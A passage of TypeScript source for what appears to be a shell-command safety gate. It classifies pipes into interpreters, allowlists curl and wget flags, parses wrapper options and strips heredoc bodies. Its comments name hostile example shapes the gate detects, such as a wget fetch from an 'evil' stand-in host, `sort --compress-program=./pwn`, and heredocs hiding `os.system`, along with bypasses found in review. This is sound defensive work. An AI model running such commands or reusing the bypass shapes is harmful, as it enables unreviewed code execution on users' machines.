 * sound here only because it exclusively ADDS a flag: a forgotten entry leaves
 * behavior exactly as it is today. The clearing rules above can never be a
 * denylist, because a gap there runs code silently.
 */
const STDIN_EXECUTING_INTERPRETERS = new Set([
	"sh", "bash", "zsh", "fish", "dash", "ksh", "csh", "tcsh",
	"python", "python2", "python3", "perl", "ruby", "node", "deno", "bun",
	"php", "lua", "tclsh", "osascript", "rscript", "julia",
]);

/** `/bin/sh` and `sh` are the same program. */
function commandBasename(word: string): string {
	const cleaned = word.toLowerCase().replace(/['"]/gu, "");
	const slash = cleaned.lastIndexOf("/");
	return slash === -1 ? cleaned : cleaned.slice(slash + 1);
}

/**
 * Resolve a word to the interpreter it names, or "" if it names none.
 *
 * `python3.12` and `ksh93` are the ordinary Homebrew/pyenv/system spellings, so
 * a trailing version cannot be what decides this. Variants are tried against
 * the set rather than stripped unconditionally, which keeps the reported name
 * exact: `python3` stays `python3` instead of collapsing to `python`.
 */
function interpreterName(word: string): string {
	const base = commandBasename(word);
	if (STDIN_EXECUTING_INTERPRETERS.has(base)) return base;
	const withoutMinor = base.replace(/\.[\d.]+$/u, "");
	if (STDIN_EXECUTING_INTERPRETERS.has(withoutMinor)) return withoutMinor;
	const withoutVersion = base.replace(/[\d.]+$/u, "");
	if (STDIN_EXECUTING_INTERPRETERS.has(withoutVersion)) return withoutVersion;
	return "";
}

/** Downstream commands that consume stdin and cannot execute it. */
const READ_ONLY_PIPE_CONSUMERS = new Set([
	"jq", "yq", "head", "tail", "cat", "wc", "grep", "rg", "egrep", "fgrep",
	"sort", "cut", "tr", "column", "nl", "rev", "tac",
	"strings", "od", "fold",
]);

/**
 * Consumers whose own flags can name a file to write. `less` and `more` are not
 * here because they are not in the consumer set at all: `-O`/`-o` are the short
 * spellings of --LOG-FILE/--log-file, and a pager on a tty additionally offers
 * `!`, `|` and `v` shell escapes, so "consumes stdin and cannot execute it" was
 * never true of them. Per-consumer, not a
 * blanket `-o` prefix test: `grep -o` and `rg -o` are --only-matching and
 * read-only, and `curl … | grep -o …` is one of the shapes this change exists
 * to stop prompting for.
 *
 * `uniq` and `xxd` are deliberately absent from the consumer set above rather
 * than listed here: their write target is a positional OPERAND
 * (`uniq [IN [OUT]]`, `xxd [in [out]]`), so no flag check can catch it.
 */
/**
 * Long flags a downstream consumer may carry. Everything else disqualifies,
 * the same fail-closed rule the fetch flags follow, and for the same reason:
 * `sort --compress-program=./pwn` and `rg --pre ./pwn` EXECUTE that program,
 * so "consumes stdin and cannot execute it" is a property of the invocation,
 * not of the verb. A missing entry here costs a prompt.
 */
const CONSUMER_SAFE_LONG_FLAGS = new Set([
	"--raw-output", "--compact-output", "--slurp", "--null-input", "--tab", "--arg",
	"--color", "--colour", "--line-number", "--no-line-number", "--only-matching",
	"--invert-match", "--ignore-case", "--word-regexp", "--fixed-strings", "--extended-regexp",
	"--count", "--quiet", "--silent", "--text", "--null-data", "--numeric-sort",
	"--reverse", "--unique", "--human-numeric-sort", "--version-sort", "--lines",
	"--bytes", "--chars", "--words", "--max-count", "--after-context", "--before-context",
	"--context", "--with-filename", "--no-filename", "--json", "--yaml-output",
]);

const CONSUMER_WRITE_FLAGS: Record<string, RegExp> = {
	// Anchored at `-` and then scanning the BUNDLE, not at `-o`: `sort -uo f`
	// and `sort -ro f` write just as `sort -o f` does.
	sort: /^--output|^-[a-zA-Z]*o/u,
	yq: /^--inplace|^--split-exp|^-[a-zA-Z]*[is]/u,
	jq: /^(--rawfile|--slurpfile)/u,
};

/**
 * curl flags that cannot name a local path. Anything not here disqualifies.
 * `-w`/`--write-out` is absent on purpose: curl 8.3+ honors `%output{path}`
 * inside the format string, which creates and truncates that file with no
 * redirect involved.
 */
const CURL_READ_ONLY_FLAGS = new Set([
	"-s", "-S", "-f", "-L", "-k", "-i", "-I", "-v", "-H", "-X", "-A", "-e", "-u",
	"-x", "-m", "-G", "-r", "-N", "-4", "-6", "-g", "-#", "-d",
	"--silent", "--show-error", "--fail", "--fail-with-body", "--location", "--insecure",
	"--include", "--head", "--verbose", "--header", "--request", "--user-agent",
	"--referer", "--user", "--proxy", "--max-time", "--connect-timeout", "--retry",
	"--retry-delay", "--retry-max-time", "--compressed", "--http1.1", "--http2",
	"--url", "--data", "--data-raw", "--data-urlencode", "--json", "--get", "--range",
	"--no-buffer", "--ipv4", "--ipv6", "--globoff", "--resolve", "--limit-rate",
	"--proto", "--tlsv1.2", "--tlsv1.3", "--no-progress-meter", "--progress-bar",
]);

/**
 * wget allowlisted flags that CONSUME the next argument. Without skipping the
 * value, `wget --tries -O- https://evil/pkg.sh` read the value as the stdout
 * marker and cleared while wget downloaded to disk.
 */
const WGET_VALUE_TAKING_FLAGS = new Set([
	"--timeout", "--connect-timeout", "--read-timeout", "--tries", "--user-agent",
	"--header", "--max-redirect", "--method", "--body-data", "--compression",
]);

/** wget flags that cannot name a local path. Anything not here disqualifies. */
const WGET_READ_ONLY_FLAGS = new Set([
	"-q", "-S", "-v", "-4", "-6", "--quiet", "--verbose", "--spider", "--server-response",
	"--timeout", "--connect-timeout", "--read-timeout", "--tries", "--user-agent",
	"--header", "--max-redirect", "--no-check-certificate", "--compression",
	"--content-on-error", "--inet4-only", "--inet6-only", "--method", "--body-data",
]);

/**
 * wget short flags that take NO value. Only these may precede `O-` in a bundle.
 *
 * getopt hands a bundle's trailing `O-` to the FIRST value-taking flag in the
 * prefix, so `-oO-` is `-o O-` (a log file named ./O-) and `-O` never applies.
 * `-qO-` is safe and is the canonical stdout idiom; `-PO-` is a download to
 * ./O-/ wearing its costume.
 */
const WGET_NO_VALUE_SHORT_FLAGS = "qSvcnd46NHLkKEmpr";

function bundleIsWgetStdout(arg: string): boolean {
	const match = /^-([a-zA-Z]*)O-$/u.exec(arg);
	if (!match) return false;
	// Both checks. Taking no value is what makes the trailing `O-` reach `-O`;
	// being on the read-only allowlist is what keeps `-mO-` (which writes
	// .listing files) and `-KO-` (.orig backups) from riding in on the prefix.
	return [...match[1]].every(
		ch => WGET_NO_VALUE_SHORT_FLAGS.includes(ch) && WGET_READ_ONLY_FLAGS.has(`-${ch}`),
	);
}

function bundleIsWgetStdoutSplit(arg: string, next: string | undefined): boolean {
	if (next !== "-") return false;
	const match = /^-([a-zA-Z]*)O$/u.exec(arg);
	if (!match) return false;
	return [...match[1]].every(
		ch => WGET_NO_VALUE_SHORT_FLAGS.includes(ch) && WGET_READ_ONLY_FLAGS.has(`-${ch}`),
	);
}

/** Short bundles like -fsSL expand to -f -s -S -L before the allowlist check. */
function expandShortBundle(arg: string): string[] {
	if (!arg.startsWith("-") || arg.startsWith("--") || arg === "-") return [arg];
	return [...arg.slice(1)].map(ch => `-${ch}`);
}

/**
 * Interpreters in a stage that will execute what is piped into them.
 *
 * Only the stage's OWN verb counts, after looking through assignments and
 * wrappers. Scanning every word read an interpreter name used as data as an
 * invocation, so `ps aux | grep python`, `ls | grep sh` and `git log | grep php`
 * all prompted. That adds prompts to far more commands than this removes them
 * from, which is the opposite of the point.
 *
 * Wrappers are stepped through by position rather than by breaking at the first
 * non-flag word: `env`, `nice`, `timeout` and `stdbuf` take options or durations
 * first, so breaking early read `timeout 5 sh` as the verb `5`.
 *
 * An interpreter with a script operand is an ordinary invocation, not a
 * stdin-executing one. `npm test | node ./scripts/parse.js` runs the file and
 * treats the pipe as data, the same convention INLINE_CODE_INTERPRETERS uses for
 * `bash script.sh`. `-` and `-s` name stdin and do not count as a script.
 */
function stdinExecutingInterpreters(stage: string): Array<{ verb: string; codeText: string | null }> {
	// ONLY the first segment. A pipe feeds the command it precedes, not whatever
	// follows a `;` or `||` inside the same stage: `curl … | jq . ; node` was
	// reported as piping into node.
	const stageSegments = tokenizeShellSegments(stage);
	// Normally only the first command is stdin-fed — `jq . ; node` does not pipe
	// into node. Inside a group the pipe feeds the WHOLE group, so
	// `| (echo hi; sh)` and `| { echo hi; sh; }` do reach the shell.
	// Tested on the raw stage: the tokenizer consumes `(` as a segment
	// boundary so it never survives as a token, while `{` does.
	const grouped = /^\s*[({]/u.test(stage);
	const candidates = grouped ? stageSegments : stageSegments.slice(0, 1);
	const found: Array<{ verb: string; codeText: string | null }> = [];
	for (const segment of candidates) {
		if (segment.length === 0) continue;
		for (const hit of interpretersInSegment(segment, stage)) {
			if (found.some(f => f.verb === hit.verb)) continue;
			found.push(hit);
		}
	}
	return found;
}

/** The resolved command or the reason wrapper parsing stopped fail-closed. */
type InterpreterInvocation = { verb: string; rest: string[]; cwdChanges?: string[]; stdinOwner?: "wrapper" } | { opaque: string } | null;

type WrapperOptionScan = { next: number; cwdChange?: string } | { opaque: string };

function scanWrapperOptions(wrapper: string, words: string[], start: number): WrapperOptionScan {
	const grammar = WRAPPER_OPTION_GRAMMAR[wrapper];
	if (!grammar) return { opaque: `script body blocked: unsupported wrapper ${wrapper}` };
	let index = start;
	let positionalValues = grammar.positionalValues ?? 0;
	let cwdChange: string | undefined;
	const rememberValue = (name: string, value: string): void => {
		if (wrapper === "env" && (name === "-C" || name === "--chdir")) cwdChange = value;
	};
	const unknown = (option: string): WrapperOptionScan => ({ opaque: `script body blocked: unknown ${wrapper} option ${option}` });
	const missingValue = (option: string): WrapperOptionScan => ({ opaque: `script body blocked: ${wrapper} option ${option} is missing its value` });

	while (index < words.length) {
		const word = words[index];
		if (word === "--") {
			index++;
			const consumed = Math.min(positionalValues, words.length - index);
			index += consumed;
			return { next: index, cwdChange };
		}
		if (grammar.assignments && /^[a-z_][a-z0-9_]*=/iu.test(word)) {
			index++;
			continue;
		}
		if (positionalValues > 0 && (!word.startsWith("-") || word === "-")) {
			positionalValues--;
			index++;
			continue;
		}
		if (!word.startsWith("-") || word === "-") return { next: index, cwdChange };
		if (wrapper === "nice" && /^-\d+(?:\.\d+)?$/u.test(word)) {
			index++;
			continue;
		}

		if (word.startsWith("--")) {
			const equal = word.indexOf("=");
			const name = equal === -1 ? word : word.slice(0, equal);
			const arity = grammar.options[name];
			if (arity === undefined) return unknown(word);
			if (arity === "opaque") return { opaque: `script body blocked: ${wrapper} option ${name} cannot be resolved` };
			if (arity === "flag") {
				if (equal !== -1) return unknown(word);
				index++;
				continue;
			}
			if (equal !== -1) {
				rememberValue(name, word.slice(equal + 1));
				index++;
				continue;
			}
			if (index + 1 >= words.length) return missingValue(name);
			rememberValue(name, words[index + 1]);
			index += 2;
			continue;
		}

		let optionIndex = 1;
		let consumed = false;
		while (optionIndex < word.length) {
			const name = `-${word[optionIndex]}`;
			const arity = grammar.options[name];
			if (arity === undefined) return unknown(word);
			if (arity === "opaque") return { opaque: `script body blocked: ${wrapper} option ${name} cannot be resolved` };
			if (arity === "value") {
				const attached = word.slice(optionIndex + 1).replace(/^=/u, "");
				if (attached !== "") {
					rememberValue(name, attached);
					index++;
				} else if (index + 1 < words.length) {
					rememberValue(name, words[index + 1]);
					index += 2;
				} else return missingValue(name);
				consumed = true;
				break;
			}
			optionIndex++;
		}
		if (!consumed) index++;
	}
	return { next: index, cwdChange };
}

/**
 * The interpreter a segment's own verb names, with the words after it.
 * Wrappers are parsed from their own option grammars: guessing that any number
 * is an option value both loses `env -u FOO python3` and reads a command the
 * wrapper will not execute.
 */
function interpreterInvocation(segment: string[]): InterpreterInvocation {
	let i = 0;
	let cwdChanges: string[] | undefined;
	let stdinOwner: "wrapper" | undefined;
	while (i < segment.length) {
		const word = segment[i].toLowerCase();
		if (word === "{" || word === "(") {
			i++;
			continue;
		}
		if (/^[a-z_][a-z0-9_]*=/u.test(word)) {
			i++;
			continue;
		}
		const wrapper = commandBasename(word);
		if (WRAPPER_COMMANDS.has(wrapper)) {
			const options = scanWrapperOptions(wrapper, segment, i + 1);
			if ("opaque" in options) return options;
			if (options.cwdChange !== undefined) (cwdChanges ??= []).push(options.cwdChange);
			if (wrapper === "xargs") stdinOwner = "wrapper";
			i = options.next;
			continue;
		}
		if (word.startsWith("-")) {
			i++;
			continue;
		}
		break;
	}
	if (i >= segment.length) return null;
	const verb = interpreterName(segment[i]);
	if (!verb) return null;
	return { verb, rest: segment.slice(i + 1), cwdChanges, stdinOwner };
}

function interpretersInSegment(segment: string[], rawStage: string): Array<{ verb: string; codeText: string | null }> {

	const invocation = interpreterInvocation(segment);
	if (!invocation) return [];
	if ("opaque" in invocation) return [{ verb: "opaque wrapper", codeText: null }];
	const { verb, rest } = invocation;
	// Inline code executes regardless of what else is on the line. The builtin
	// INLINE_CODE_INTERPRETERS covers -c/-e for python/bash/sh/perl only, which
	// left node, deno, bun, ruby, php and the rest with no inline-code path.
	// The payload travels with the command, so the classifier read it verbatim:
	// report it as visible code and let the caller apply the same plain-code
	// release rule the non-piped interpreter path uses.
	const inlineFlag = rest.findIndex(word => /^-{1,2}(c|e|E|eval|command)$/u.test(word));
	if (inlineFlag !== -1) {
		return [{ verb, codeText: rest.slice(inlineFlag + 1).join(" ") }];
	}
	// `-` and `-s` say the program comes from stdin, and any operand after one
	// of them is an ARGUMENT ($1), not a script. `cat ./installer | sh -s foo`
	// executes the pipe. When the stdin payload is a heredoc its body sits in
	// this stage's own text and the classifier read it too; without a heredoc
	// the payload is opaque and codeText stays null (fail closed).
	const stdinMarker = rest.findIndex(word => word === "-" || word === "-s");
	if (stdinMarker !== -1) {
		return [{ verb, codeText: heredocBody(rawStage) }];
	}
	// Otherwise an interpreter given a script runs the script; the pipe is data.
	const hasScriptOperand = rest.some(word => !word.startsWith("-") && word !== "-");
	return hasScriptOperand ? [] : [{ verb, codeText: null }];
}

/**
 * Heredoc bodies written straight to a file, removed before anything tokenizes
 * the command.
 *
 * The bug: a body is stdin DATA, but every scan here tokenizes the whole
 * command text, so a body's words read as a command line. `cat > f.ts <<'EOF'`
 * writing `if (dd < 30) {` flagged `dd` — the tokenizer splits on `(` and
 * treats `<` as a redirect, so the body produced a segment whose verb was a
 * raw-disk-write binary, and a SAFE verdict on a plain file write hit the
 * forced dialog.
 *
 * The scope of the fix is deliberately tiny, and that is the design. Two
 * earlier cuts tried to decide, for any heredoc, whether the shell executes its
 * body. Three review rounds returned twenty findings against them, because that
 * decision is a shell parser: quoting, wrappers, `$x` owners, `{ … }` groups,
 * comments, `awk -f -`, `xargs tee`, delimiter words, closer lines, multiple
 * redirections to one stdin. Every miss was a SILENT BYPASS, because a wrong
 * "this is data" answer deletes text the scans would have flagged.
 *
 * So this version does not decide anything. It matches ONE shape, spelled out
 * in a single regex: a whole owner line that is nothing but `cat` or `tee`,
 * optional flags, optional redirect targets, and a QUOTED heredoc delimiter at
 * the end. Nothing else on the line, so no comment, expansion, substitution,
 * pipe or second command can be hiding in it. Anything that fails to match —
 * which is every shape those twenty findings used — keeps the behavior this
 * file had before the fix: the body stays in the command text and is scanned
 * as commands. That over-flags, and over-flagging is the direction this overlay
 * is allowed to be wrong in.
 */
const HEREDOC_DATA_WRITE =
	/(?:^|(?<=[\n;|&(){}]))[ \t]*(?:cat|tee)(?![^\s;|&(){}<>])(?:[ \t]+-{1,2}[A-Za-z][A-Za-z-]*)*(?:[ \t]*(?:\d?>>?[ \t]*)?[^\s;|&<>'"`$#-][^\s;|&<>'"`$#]*)*[ \t]*<<(-?)[ \t]*(['"])([A-Za-z_][A-Za-z0-9_.-]*)\2[ \t]*$/gmu;

export function withoutWrittenHeredocBodies(command: string): string {
	if (!command.includes("<<")) return command;
	HEREDOC_DATA_WRITE.lastIndex = 0;
	const kept: string[] = [];
	let copied = 0;
	let opener: RegExpExecArray | null;
	while ((opener = HEREDOC_DATA_WRITE.exec(command)) !== null) {
		// A physical newline ends a command only when the shell does not glue
		// the lines: `bash -s \` + an owner line feeds the body to bash's
		// stdin, where it runs as script text. And a `#` earlier on the line
		// makes the whole owner a comment, so the lines after it are live
		// commands, not body. Neither shape strips; both keep everything the
		// regex would have deleted under scan. An escaped backslash before
		// the newline also counts as glued, which only ever over-flags.
		const lineStart = command.lastIndexOf("\n", opener.index - 1) + 1;
		const glued = command[opener.index - 1] === "\n" && command[opener.index - 2] === "\\";
		const commented = command.slice(lineStart, opener.index).includes("#");
		const bodyStart = command.indexOf("\n", opener.index + opener[0].length);
		if (bodyStart === -1) break;
		const delimiter = opener[3].replace(/[.*+?^${}()|[\]\\]/gu, "\\$&");
		// The closer is the WHOLE line, and only `<<-` strips leading tabs, so
		// `  EOF` is body text for a plain `<<` exactly as the shell reads it.
		const closer = new RegExp(`^${opener[1] === "-" ? "\\t*" : ""}${delimiter}$`, "mu")
			.exec(command.slice(bodyStart + 1));
		if (glued) {
			// A glued owner opens a real heredoc only if its closer exists;
			// with no closer the body runs to EOF, so every later owner line
			// sits inside it and stripping ends, exactly like the normal
			// path below. With a closer, scanning resumes after it so data
			// lines inside the glued body never strip as if they were owners.
			if (!closer) break;
			const lineEnd = command.indexOf("\n", bodyStart + 1 + closer.index);
			HEREDOC_DATA_WRITE.lastIndex = lineEnd === -1 ? command.length : lineEnd + 1;
			continue;
		}
		if (commented || openQuoteBefore(command, opener.index)) {
			// A comment opens nothing, so the lines after it are live
			// commands; an owner inside a multi-line string is string text.
			// Neither shape strips, and scanning resumes after the owner
			// line for both.
			continue;
		}
		// An owner-shaped line inside another heredoc's body is data to the
		// outer cat or tee. With a QUOTED outer delimiter nothing in the body
		// runs, but an unquoted one expands before the outer command reads
		// it, so no strip inside another body can call its payload inert.
		// Over-flag: the whole region stays under scan.
		if (heredocShadowedAt(command, opener.index)) continue;
		// No closer means the parse cannot say where the body ends, so every
		// later owner line sits inside this body and nothing after it strips.
		if (!closer) break;
		const bodyEnd = bodyStart + 1 + closer.index;
		const lineEnd = command.indexOf("\n", bodyEnd);
		const next = lineEnd === -1 ? command.length : lineEnd + 1;
		kept.push(command.slice(copied, bodyStart + 1));
		copied = next;
		HEREDOC_DATA_WRITE.lastIndex = next;
	}
	if (kept.length === 0) return command;
	kept.push(command.slice(copied));
	return kept.join("");
}

/** Body of the first heredoc redirection in `text`, or null when the text
 *  carries none. The body is everything after the opener line up to the
 *  closing delimiter line; an unterminated heredoc runs to the end, which is
 *  what the shell would read. */
function heredocBody(text: string): string | null {
	const opener = /<<(-?)[ \t]*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\2/u.exec(text);
	if (!opener) return null;
	const start = text.indexOf("\n", opener.index);
	if (start === -1) return null;
	const tail = text.slice(start + 1);
	// The closer is the whole line, and only `<<-` strips leading tabs. Accepting
	// an indented delimiter ended the payload early, so an interpreter body could
	// hide its `os.system` behind a `  EOF` line and read as plain code. Trailing
	// whitespace disqualifies a closer too: the shell keeps reading, so a body
	// may hide its second act behind an `EOF ` line.
	const closer = new RegExp(`^${opener[1] === "-" ? "\\t*" : ""}${opener[3]}$`, "mu").exec(tail);
	return closer ? tail.slice(0, closer.index) : tail;
}

/** A file or redirected input body the command hands to an interpreter (issue #67). */
interface InterpreterProgramRef {
	verb: string;
	/** The word as the command spelled it, for the flag text and the refusal. */
	operand: string;
	/** `stdin` is a literal file the interpreter executes from redirected stdin. */
	arm: "program" | "load" | "stdin";
	/** A file-taking flag that independently loads executable code. */
	loader?: true;
}

/**
 * A flag word split into the flag's NAME and a value ATTACHED to it.
 *
 * Two spellings carry a value in the same word: the long form with `=`
 * (`--preload=./pre.ts`, the one bun's own `--help` documents as
 * `-r, --preload=<val>`) and the getopt short form (`-r./pre.ts`,
 * `-Wignore`, `-Ilib`, `-dmemory_limit=64M`). Both are read by name so the
 * value is not lost between the flag and the operand scan (round 3 review).
 *
 * `long` says which spelling this is, because the two are not equally
 * trustworthy for a flag whose value is CODE: `--flag=value` is that flag's
 * own value, while `-cvalue` is also how a cluster of short flags writes
 * itself (`bash -cx ./script.sh`), so the caller keeps the operand slot open
 * for the short spelling. A word carrying no attached value comes back with
 * the whole word as its name, which is what every other check reads.
 */
function splitAttachedFlagValue(word: string): { name: string; attached: string | undefined; long: boolean } {
	if (word.startsWith("--")) {
		const eq = word.indexOf("=");
		if (eq !== -1) return { name: word.slice(0, eq), attached: word.slice(eq + 1), long: true };
		return { name: word, attached: undefined, long: false };
	}
	const short = /^-([A-Za-z])(.+)$/u.exec(word);
	if (short !== null) {
		// `-f=x` names `x`, not `=x`: the tool's own parser drops the `=` after
		// a short flag (measured: `php -f=eq-marker.php` runs `eq-marker.php`
		// while a file literally named `=eq-marker.php` sits beside it), so the
		// `=` is a separator here rather than the first character of the name.
		// Stripping it can only ever read the file the tool opens; the spelling
		// that really passes `=x` is not one any interpreter in the table takes.
		const tail = short[2].startsWith("=") ? short[2].slice(1) : short[2];
		return { name: `-${short[1]}`, attached: tail, long: false };
	}
	return { name: word, attached: undefined, long: false };
}

/** The interpreter-program words one segment names, in command order. */
function interpreterProgramRefs(segment: string[]): InterpreterProgramRef[] {
	const invocation = interpreterInvocation(segment);
	if (!invocation) return [];
	if ("opaque" in invocation) return [];
	const { verb, rest } = invocation;
	const subcommands = INTERPRETER_SUBCOMMANDS[verb];
	// `python3`/`python2` carry the version in the verb `interpreterName`
	// reports, so the version-stripped spelling is tried before giving up.
	const grammar = INTERPRETER_FLAG_GRAMMAR[verb] ?? INTERPRETER_FLAG_GRAMMAR[verb.replace(/[\d.]+$/u, "")];
	const refs: InterpreterProgramRef[] = [];
	let arm: "program" | "load" = "program";
	for (let i = 0; i < rest.length; i++) {
		const word = rest[i];
		if (word === "") continue;
		if (word.startsWith("-")) {
			// A value the interpreter takes ATTACHED to its flag is the same
			// value as the separated spelling, and reading the flag word alone
			// loses it: `bun --preload=./payload.ts run safe.ts` read only
			// safe.ts, so code in the preload ran unjudged (round 3 review).
			// Split the word once and read the flag by its NAME from here on.
			const flag = splitAttachedFlagValue(word);
			// The program travels in a flag's value, or on stdin: those spellings
			// keep their existing treatment (inline-code and pipe scans). The
			// table is per verb because the letters are: `-E` is code for perl
			// and environment control for python, `-s` is stdin for a shell and
			// switch parsing for perl.
			//
			// `--flag=code` is that flag's own value and ends the scan like the
			// separated spelling does. A SHORT word with characters after the
			// letter is deliberately not read as that letter's value: `bash -cx
			// ./script.sh` is a cluster whose `-c` still takes the next word as
			// its code, so ending the scan there would stop reading a file the
			// shell runs. The word falls through instead, which keeps the
			// program slot open (round 3 review).
			if (
				SHARED_INLINE_FLAG.test(flag.name) ||
				grammar?.inline.test(flag.name) ||
				(grammar?.stdinFlag === true && flag.name === "-s")
			) {
				if (flag.attached === undefined || flag.long) return refs;
			}
			// A flag whose value IS a file the interpreter runs, not a setting:
			// the interpreter opens that file whatever the operand's grammatical
			// role, so the value is read like its own operand — and the program
			// slot stays open for the word after it, which is what makes `bun
			// --preload ./pre.ts run main.ts` read both files. Both spellings of
			// that value are read here (`--preload ./pre.ts`, `--preload=./pre.ts`,
			// `-r ./pre.ts`, `-r./pre.ts`), because the attached spelling hides a
			// program just as well as the separated one (round 3 review). A value
			// the shell expands is read as the operand it cannot be, so it
			// refuses rather than passing over (round 2 review).
			if (grammar?.file?.test(flag.name) === true) {
				if (flag.attached !== undefined) {
					if (flag.attached !== "") refs.push({ verb, operand: flag.attached, arm: "program", loader: true });
					continue;
				}
				const value = rest[i + 1];
				i++;
				if (value !== undefined && value !== "") refs.push({ verb, operand: value, arm: "program", loader: true });
				continue;
			}
			// A flag whose separate value word is NOT a program: consume that
			// word here, so `python3 -W ignore payload` reads `payload` instead
			// of treating the warning filter as the program and pushing the real
			// one into the load arm, where an extensionless word is passed over.
			// A value attached to the flag (`-Wextra`, `--input-type=module`,
			// `-dmemory_limit=64M`) consumes no word of its own, so the next word
			// is still read as the program it is.
			if (grammar?.value?.test(flag.name) === true) {
				if (flag.attached === undefined) i++;
				continue;
			}
			// `python3 -m pkg` runs a module the interpreter resolves through its
			// own import path. That is a lookup this scan does not model, and the
			// module is not a file the command named, so the rest of the line is
			// the module's ARGUMENTS, not a program.
			if (verb.startsWith("python") && (flag.name === "-m" || flag.name === "--module")) return refs;
			continue;
		}
		if (arm === "program" && subcommands?.has(word)) {
			arm = "load";
			continue;
		}
		if (arm === "load" && !SCRIPT_FILE_EXTENSION.test(word) && !word.includes("/")) continue;
		refs.push({ verb, operand: word, arm });
		// The program slot is filled: everything after it is an argument, and only
		// a script-shaped word is read past it (a loader's second file).
		arm = "load";
	}
	return refs;
}

/** True when the interpreter's main file is only parsed, not executed. */
function interpreterSyntaxOnly(segment: string[]): boolean {
	const invocation = interpreterInvocation(segment);
	if (!invocation || "opaque" in invocation) return false;
	const { verb, rest } = invocation;
	const grammar = INTERPRETER_FLAG_GRAMMAR[verb] ?? INTERPRETER_FLAG_GRAMMAR[verb.replace(/[\d.]+$/u, "")];
	for (let i = 0; i < rest.length; i++) {
		const word = rest[i];
		if (word === "--") return false;
		if (!word.startsWith("-") || word === "-") return false;
		const flag = splitAttachedFlagValue(word);
		if (grammar?.syntaxOnly?.test(flag.name)) return true;
		if (verb.startsWith("python") && (flag.name === "-m" || flag.name === "--module")) {
			return rest[i + 1] === "py_compile";
		}
		if (grammar?.value?.test(flag.name) || grammar?.file?.test(flag.name)) {
			if (flag.attached === undefined) i++;
			continue;
		}
		if (SHARED_INLINE_FLAG.test(flag.name) || grammar?.inline.test(flag.name)) return false;
	}
	return false;
}

/** Whether an interpreter has no separate program and will execute stdin. */
function interpreterReadsRedirectedStdin(segment: string[]): { verb: string } | null {
	const invocation = interpreterInvocation(segment);
	if (!invocation) return null;
	if ("opaque" in invocation) return null;
	if (invocation.stdinOwner === "wrapper" || interpreterSyntaxOnly(segment)) return null;
	const { verb, rest } = invocation;
	if (rest.some(word => /^-{1,2}(c|e|E|eval|command)$/u.test(word))) return null;
	if (verb.startsWith("python") && rest.some(word => word === "-m" || word === "--module")) return null;
	const grammar = INTERPRETER_FLAG_GRAMMAR[verb] ?? INTERPRETER_FLAG_GRAMMAR[verb.replace(/[\d.]+$/u, "")];
	if (rest.includes("-") || (grammar?.stdinFlag === true && rest.includes("-s"))) return { verb };
	return interpreterProgramRefs(segment).length === 0 ? { verb } : null;
}

type StdinDescriptorSource = { kind: "file"; target: ShellRedirect["target"] } | { kind: "inline" | "closed" | "unknown" };
type RedirectedStdinFlow = StdinDescriptorSource | { kind: "none" };

/** Follow only literal descriptor copies; an unknown source cannot be judged as no input. */
function redirectedStdinFlow(redirects: ShellRedirect[]): RedirectedStdinFlow {
	const descriptors = new Map<string, StdinDescriptorSource>();
	let stdin: StdinDescriptorSource | undefined;
	for (const redirect of redirects) {
		const fd = redirect.fd || (redirect.direction === "out" ? "1" : "0");
		let source: StdinDescriptorSource;
		if (redirect.duplicate) {
			if (redirect.target.value === "-") source = { kind: "closed" };
			else if (/^\d+$/u.test(redirect.target.value)) source = descriptors.get(redirect.target.value) ?? { kind: "unknown" };
			else source = { kind: "unknown" };
		} else if (redirect.here) {
			source = { kind: "inline" };
		} else if (redirect.direction === "in" || redirect.direction === "both") {
			source = { kind: "file", target: redirect.target };
		} else {
			source = { kind: "unknown" };
		}
		descriptors.set(fd, source);
		if (fd === "0") stdin = source;
	}
	return stdin ?? { kind: "none" };
}

export interface InterpretedScriptBody {
	/** The interpreter that will run it. */
	verb: string;
	/** The program word, as the command spelled it. */
	operand: string;
	/** The file's contents, verbatim. */
	body: string;
}

export interface ReadScriptBodiesResult {
	/** The text the gate judges: `command`, plus one fenced section per body. */
	text: string;
	/** The bodies that were read, in command order. */
	bodies: InterpretedScriptBody[];
	/** Fail-closed stop: a program the classifier could not read in full. */
	refusal: { why: string } | null;
}

/** One program word resolved against the disk: what to read, or why not. */
type ScriptFileRead = { kind: "body"; body: string } | { kind: "skip" } | { kind: "refuse"; why: string };

/** Resolve and read one program word. `budget` is what the review limit has
 *  left for this body once the command and the section's labels are counted.
 *
 *  Only "this word is not a file the interpreter resolves" may be passed over,
 *  and only for a loader operand. A word that names a file the scan could not
 *  read in full is refused on either arm: the interpreter opens that file
 *  whatever the operand's grammatical role, so `bun run huge.ts` over the
 *  review limit is a program the gate could not read, not an argument it can
 *  ignore. Passing it over left the call with no body read, and a matching
 *  non-blanket allow rule could then release it (issue #67 review round 1). */
function readScriptFile(ref: InterpreterProgramRef, cwd: string, budget: number): ScriptFileRead {
	// An expanded word names nothing the gate can resolve. The interpreter's own
	// operand slot cannot be spelled that way (the shell expands it into the
	// program, so the program is not readable text); a loader's operand may
	// legitimately be a package.json script or an argument, so it is passed over.
	if (SHELL_WORD_EXPANSION.test(ref.operand)) {
		if (ref.arm === "load") return { kind: "skip" };
		return {
			kind: "refuse",
			why:
				`script body blocked: the shell expands ${ref.operand} before ${ref.verb} sees it, ` +
				`so the ${ref.arm === "stdin" ? "stdin payload" : "program"} is not readable text`,
		};
	}
	let file: string;
	let stat: fs.Stats;
	try {
		file = resolveToCwd(ref.operand, cwd);
		stat = fs.statSync(file);
	} catch (err) {
		// A missing program runs nothing. A missing redirected stdin source is
		// refused because the command's input cannot be read in full. Other stat
		// failures (EACCES on the directory, ELOOP, ENAMETOOLONG, an internal URL)
		// mean the gate cannot see the file at all.
		if ((err as NodeJS.ErrnoException).code === "ENOENT") {
			if (ref.arm !== "stdin") return { kind: "skip" };
			return { kind: "refuse", why: `script body blocked: redirected stdin file ${ref.operand} does not exist` };
		}
		return {
			kind: "refuse",
			why: `script body blocked: ${ref.operand} could not be read (${err instanceof Error ? err.message : String(err)})`,
		};
	}
	if (!stat.isFile()) {
		// A directory in a loader's position is not a program: `bun run dev`
		// reads package.json, and a same-named directory must not turn the
		// invocation into an unreadable program. In the interpreter's own
		// operand slot a directory IS the program (python opens it as
		// `__main__.py`), so there it refuses.
		if (ref.arm === "load") return { kind: "skip" };
		return {
			kind: "refuse",
			why:
				`script body blocked: ${ref.operand} is a ${stat.isDirectory() ? "directory" : "non-regular file"}, ` +
				`and the classifier cannot read ${ref.arm === "stdin" ? "the input it executes" : "the program it runs"}`,
		};
	}
	if (stat.size > budget) {
		return {
